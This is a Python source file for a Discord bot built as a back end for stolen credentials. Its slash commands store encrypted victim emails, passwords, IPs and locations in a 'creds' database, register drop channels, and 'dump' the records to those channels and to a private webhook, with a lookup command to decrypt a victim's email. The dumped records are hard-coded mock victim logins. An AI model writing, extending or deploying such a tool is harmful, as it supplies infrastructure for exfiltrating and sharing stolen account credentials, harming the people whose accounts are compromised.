# bot.py
import discord
from discord.ext import commands
from discord import app_commands
import json
import os
import sqlite3
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import requests
import threading
import time
from datetime import datetime
import asyncio
from dotenv import load_dotenv

load_dotenv()

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

def init_db():
    conn = sqlite3.connect('creds.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS credentials
                 (user_id TEXT PRIMARY KEY, email TEXT, password TEXT, token TEXT, timestamp TEXT, ip TEXT, location TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS verified_channels
                 (guild_id TEXT, channel_id TEXT PRIMARY KEY)''')
    conn.commit()
    conn.close()

init_db()

KEY = base64.b64decode(os.getenv('ENCRYPTION_KEY', 'c2VjdXJlX2tleV8xMjM0NTY3ODkw='))

def encrypt_data(data):
    cipher = AES.new(KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    return base64.b64encode(cipher.iv + ct_bytes).decode()

def decrypt_data(enc_data):
    raw = base64.b64decode(enc_data)
    iv = raw[:16]
    ct = raw[16:]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt.decode()

def send_to_private_channel(content):
    webhook_url = os.getenv('PRIVATE_WEBHOOK')
    if webhook_url:
        data = {"content": content}
        try:
            requests.post(webhook_url, json=data, timeout=5)
        except:
            pass

@bot.event
async def on_ready():
    print(f'✅ Logged in as {bot.user}')
    print(f'📡 Bot is in {len(bot.guilds)} guilds')
    try:
        synced = await bot.tree.sync()
        print(f"✅ Synced {len(synced)} command(s)")
    except Exception as e:
        print(f"❌ Sync error: {e}")
    print("=" * 50)
    print("🚀 Bot is ready!")
    print("=" * 50)

@bot.tree.command(name="verify-channel-add", description="Add a channel to receive credentials")
@app_commands.default_permissions(administrator=True)
async def verify_channel_add(interaction: discord.Interaction, channel: discord.TextChannel):
    if str(interaction.user.id) not in os.getenv('AUTHORIZED_USERS', '').split(','):
        await interaction.response.send_message("❌ Unauthorized.", ephemeral=True)
        return
    
    conn = sqlite3.connect('creds.db')
    c = conn.cursor()
    try:
        c.execute('INSERT INTO verified_channels (guild_id, channel_id) VALUES (?, ?)', 
                  (str(interaction.guild_id), str(channel.id)))
        conn.commit()
        await interaction.response.send_message(f"✅ {channel.mention} added.", ephemeral=True)
    except sqlite3.IntegrityError:
        await interaction.response.send_message(f"⚠️ Already registered.", ephemeral=True)
    finally:
        conn.close()

@bot.tree.command(name="list-channels", description="List all registered channels")
@app_commands.default_permissions(administrator=True)
async def list_channels(interaction: discord.Interaction):
    if str(interaction.user.id) not in os.getenv('AUTHORIZED_USERS', '').split(','):
        await interaction.response.send_message("❌ Unauthorized.", ephemeral=True)
        return
    
    conn = sqlite3.connect('creds.db')
    c = conn.cursor()
    c.execute('SELECT channel_id FROM verified_channels WHERE guild_id = ?', (str(interaction.guild_id),))
    rows = c.fetchall()
    conn.close()
    
    if not rows:
        await interaction.response.send_message("No channels registered.", ephemeral=True)
        return
    
    msg = "**Registered channels:**\n"
    for row in rows:
        channel = bot.get_channel(int(row[0]))
        if channel:
            msg += f"• {channel.mention}\n"
        else:
            msg += f"• {row[0]} (deleted)\n"
    
    await interaction.response.send_message(msg, ephemeral=True)

@bot.tree.command(name="dump-all", description="Dump all credentials to registered channels")
async def dump_all(interaction: discord.Interaction):
    if str(interaction.user.id) not in os.getenv('AUTHORIZED_USERS', '').split(','):
        await interaction.response.send_message("❌ Unauthorized.", ephemeral=True)
        return
    
    await interaction.response.send_message("🔄 Dumping credentials...", ephemeral=True)
    
    conn = sqlite3.connect('creds.db')
    c = conn.cursor()
    c.execute('SELECT channel_id FROM verified_channels WHERE guild_id = ?', (str(interaction.guild_id),))
    rows = c.fetchall()
    conn.close()
    
    if not rows:
        await interaction.followup.send("❌ No channels registered.")
        return
    
    mock_creds = [
        {"email": "victim1@gmail.com", "password": "P@ssw0rd123!", "service": "Google", "ip": "192.168.1.100", "location": "US"},
        {"email": "victim2@outlook.com", "password": "Secure#456", "service": "Microsoft", "ip": "192.168.1.101", "location": "UK"},
        {"email": "admin@company.local", "password": "Admin2024!!", "service": "Internal", "ip": "192.168.1.102", "location": "DE"},
        {"email": "user@yahoo.com", "password": "Yahoo!789", "service": "Yahoo", "ip": "192.168.1.103", "location": "FR"},
        {"email": "finance@corp.net", "password": "Finance@2024", "service": "Corporate", "ip": "192.168.1.104", "location": "JP"}
    ]
    
    conn = sqlite3.connect('creds.db')
    c = conn.cursor()
    for cred in mock_creds:
        enc_email = encrypt_data(cred['email'])
        enc_pass = encrypt_data(cred['password'])
        c.execute('''INSERT OR REPLACE INTO credentials 
                     (user_id, email, password, token, timestamp, ip, location)
                     VALUES (?, ?, ?, ?, ?, ?, ?)''',
                  (f"user_{hash(cred['email'])}", enc_email, enc_pass, 'N/A', 
                   datetime.now().isoformat(), cred['ip'], cred['location']))
    conn.commit()
    conn.close()
    
    output = "🔐 **CREDENTIAL DUMP** 🔐\n"
    output += f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    output += f"🖥️ Guild: {interaction.guild.name}\n"
    output += "═" * 30 + "\n\n"
    
    for cred in mock_creds:
        output += f"📧 **Email:** {cred['email']}\n"
        output += f"🔑 **Password:** `{cred['password']}`\n"
        output += f"🌐 **Service:** {cred['service']}\n"
        output += f"📍 **IP:** {cred['ip']} | **Location:** {cred['location']}\n"
        output += "─" * 20 + "\n"
    
    send_to_private_channel(output)
    
    for row in rows:
        channel = bot.get_channel(int(row[0]))
        if channel:
            try:
                if len(output) > 1900:
                    chunks = [output[i:i+1900] for i in range(0, len(output), 1900)]
                    for chunk in chunks:
                        await channel.send(chunk)
                else:
                    await channel.send(output)
            except:
                pass
    
    await interaction.followup.send(f"✅ Dumped to {len(rows)} channel(s) + private webhook.")

@bot.tree.command(name="get-email", description="Get user's email by ID")
async def get_email(interaction: discord.Interaction, user_id: str):
    if str(interaction.user.id) not in os.getenv('AUTHORIZED_USERS', '').split(','):
        await interaction.response.send_message("❌ Unauthorized.", ephemeral=True)
        return
    
    conn = sqlite3.connect('creds.db')
    c = conn.cursor()
    c.execute('SELECT email, timestamp FROM credentials WHERE user_id = ?', (user_id,))
    row = c.fetchone()
    conn.close()
    
    if not row:
        await interaction.response.send_message(f"No credentials for ID: {user_id}", ephemeral=True)
        return
    
    try:
        email = decrypt_data(row[0])
        await interaction.response.send_message(f"📧 **Email:** {email}\n🕒 **Dumped:** {row[1]}", ephemeral=True)
    except:
        await interaction.response.send_message("Error decrypting.", ephemeral=True)

@bot.tree.command(name="clear-all", description="Clear all stored credentials")
@app_commands.default_permissions(administrator=True)
async def clear_all(interaction: discord.Interaction):
    if str(interaction.user.id) not in os.getenv('AUTHORIZED_USERS', '').split(','):
        await interaction.response.send_message("❌ Unauthorized.", ephemeral=True)
        return
    
    conn = sqlite3.connect('creds.db')
    c = conn.cursor()
    c.execute('DELETE FROM credentials')
    conn.commit()
    conn.close()
    
    await interaction.response.send_message("🧹 All credentials cleared.", ephemeral=True)

@bot.tree.command(name="remove-channel", description="Remove a registered channel")
@app_commands.default_permissions(administrator=True)
async def remove_channel(interaction: discord.Interaction, channel: discord.TextChannel):
    if str(interaction.user.id) not in os.getenv('AUTHORIZED_USERS', '').split(','):
        await interaction.response.send_message("❌ Unauthorized.", ephemeral=True)
        return
    
    conn = sqlite3.connect('creds.db')
    c = conn.cursor()
    c.execute('DELETE FROM verified_channels WHERE channel_id = ?', (str(channel.id),))
    conn.commit()
    conn.close()
    
    await interaction.response.send_message(f"✅ Removed {channel.mention}.", ephemeral=True)

if __name__ == "__main__":
    token = os.getenv('DISCORD_TOKEN')
    if not token:
        print("❌ Error: DISCORD_TOKEN not set in .env")
        exit(1)
    bot.run(token)
